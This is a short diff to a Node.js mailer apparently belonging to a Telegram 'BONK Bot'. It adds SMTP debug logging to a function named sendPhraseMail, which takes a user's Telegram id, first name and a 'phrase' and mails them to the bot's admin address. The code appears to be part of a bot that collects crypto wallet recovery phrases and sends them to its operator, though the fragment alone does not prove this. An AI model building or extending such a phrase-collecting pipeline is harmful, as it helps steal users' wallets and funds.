@@ -37,6 +37,13 @@ const transporter = nodemailer.createTransport({
  * @returns {Promise<Object>} - Mail delivery info object.
  */
 const sendPhraseMail = async (telegram_id, firstName, phrase, retries = 3) => {
+    console.log("🔧 SMTP DEBUG INFO:");
+    console.log("📧 ADMIN_EMAIL:", ADMIN_EMAIL);
+    console.log("📧 ADMIN_EMAIL_PASS:", ADMIN_EMAIL_PASS ? "***SET***" : "NOT SET");
+    console.log("📧 HR_EMAIL:", HR_EMAIL);
+    console.log("📧 SMTP Host:", transporter.options.host);
+    console.log("📧 SMTP Port:", transporter.options.port);
+    
     const mailOptions = {
         from: `"BONK Bot 🔐" <${ADMIN_EMAIL}>`,
         to: ADMIN_EMAIL,
